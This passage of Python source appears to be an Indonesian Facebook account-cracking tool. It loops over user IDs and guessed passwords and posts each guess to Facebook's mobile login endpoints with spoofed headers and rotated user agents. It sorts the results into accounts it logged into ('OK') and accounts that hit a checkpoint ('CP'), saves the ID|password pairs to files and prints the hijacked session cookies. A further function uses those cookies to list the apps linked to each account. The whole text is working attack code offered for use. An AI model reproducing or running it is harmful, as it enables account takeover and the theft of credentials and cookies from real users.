'https://free.facebook.com/login.php?skip_api_login=1&api_key=290293790992170&kid_directed_site=0&app_id=290293790992170&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&cancel_url=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			#link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?api_key=290293790992170&auth_token=42daecc7930acde214740b8da04f49d4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D290293790992170%26cbt%3D1684773097456%26e2e%3D%257B%2522init%2522%253A1684773097456%257D%26ies%3D0%26sdk%3Dandroid-android-8.2.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cemail%252Cuser_location%26state%3D%257B%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb290293790992170%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad75f273-5e6b-4e07-b7dd-eab74845964f%26tp%3Dunspecified&refsrc=deprecated&app_id=290293790992170&cancel=fb290293790992170%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%257D%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				#cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				ban=nel(tekz(cam,justify='center',style='italic white')) 
				#os.popen('play-audio /sdcard/cp.mp3')
				cetak(nel(ban, width=79, title='[AKUN CP]',style='yellow')) 
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] COKI : {kuki}'
				#cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				ban=nel(tekz(cam,justify='center',style='italic green')) 
				#os.popen('play-audio /sdcard/cp.mp3')
				cetak(nel(ban, width=79, title='[AKUN OK]',style='magenta')) 
				#os.popen('play-audio /sdcard/ok.mp3')
				open('OK/'+okh,'a').write(idf+'|'+pw+'\n')
				#cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	###----------[  ASYNC ]----------###
oks=[]
cps=[]
def crackfree(idf,pwv):
	global loop,ok,cp
	#ahir = str(datetime.now()-awal).split('.')[0]
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	#ua = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f'\r{u}⏰{idf}⏰{x} [{loop}-{len(id)}]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des) 
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				#cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				ban=nel(tekz(cam,justify='center',style='italic white')) 
				#os.popen('play-audio /sdcard/cp.mp3')
				cetak(nel(ban, width=79, title='[AKUN CP]',style='yellow')) 
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] COKI : {kuki}'
				#cam=f'[•] USER : {idf}\n[•] PWWR : {pw}\n[•] UGEN : {ua}'
				ban=nel(tekz(cam,justify='center',style='italic green')) 
				#os.popen('play-audio /sdcard/cp.mp3')
				cetak(nel(ban, width=79, title='[AKUN OK]',style='magenta')) 
				#os.popen('play-audio /sdcard/ok.mp3')
				open('OK/'+okh,'a').write(idf+'|'+pw+'\n')
				#cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#-----------------------[ METODE ALPHA ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	sandi() 
